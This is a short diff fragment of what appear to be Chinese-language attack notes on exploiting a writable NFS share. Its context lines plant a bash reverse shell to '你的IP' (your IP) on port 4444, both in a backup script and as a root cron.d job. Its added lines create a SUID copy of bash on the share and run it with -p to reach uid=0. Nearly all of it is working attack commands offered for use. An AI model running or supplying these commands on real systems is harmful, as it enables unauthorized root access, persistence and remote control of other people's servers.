@@ -41,3 +41,15 @@ ssh -i ~/.ssh/id_rsa user@ip
 echo 'bash -i >& /dev/tcp/你的IP/4444 0>&1' > ./nfs/backup.sh
 # 或 3b. 往 cron.d 丢任务
 echo '* * * * * root bash -i >& /dev/tcp/你的IP/4444 0>&1' > ./nfs/mytask
+
+如果是普通目录
+# 4a. 造 SUID bash
+cp /bin/bash ./nfs/rootbash
+chmod u+s ./nfs/rootbash
+ls -l ./nfs/rootbash      # 确认 -rwsr-xr-x
+# 4b. 但还需要"能在服务器上执行它"的通道——比如：
+#     - 你有别的洞拿了 SSH / webshell
+#     - 或者共享目录本身能被某个服务调用
+# 然后在服务器上执行：
+/xxx/rootbash -p
+id                        # uid=0(root)
